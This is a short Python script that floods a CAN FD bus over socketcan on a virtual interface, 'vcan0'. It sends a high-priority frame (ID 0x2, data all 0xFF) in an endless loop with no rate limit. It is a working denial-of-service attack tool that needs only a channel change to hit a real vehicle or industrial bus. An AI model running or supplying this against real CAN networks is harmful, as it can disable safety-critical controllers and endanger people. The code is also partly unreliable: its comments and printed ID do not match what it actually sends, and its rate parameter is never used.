#!/usr/bin/python3

import can
import time

def flood_can_bus(interface, message_rate=100000000):
    bus = can.interface.Bus(channel=interface, interface='socketcan', fd=True)
    while True:
        try:
            # Create a CAN FD message (with random data)
            message = can.Message(
                arbitration_id=0x2,  # Arbitrary ID
                dlc=8,                 # Data length code
                data=[0xFF] * 8,       # Random data (can be customized)
                is_extended_id=True,
                is_fd=True
            )
            # Send the message at the specified rate
            bus.send(message)
            print(f"Flooding message: ID=0x123, Data={message.data.hex()}")
            # time.sleep(1 / message_rate)  # Control the message rate
        except can.CanError as e:
            print(f"Error sending message: {e}")
            break

flood_can_bus("vcan0", message_rate=100000000)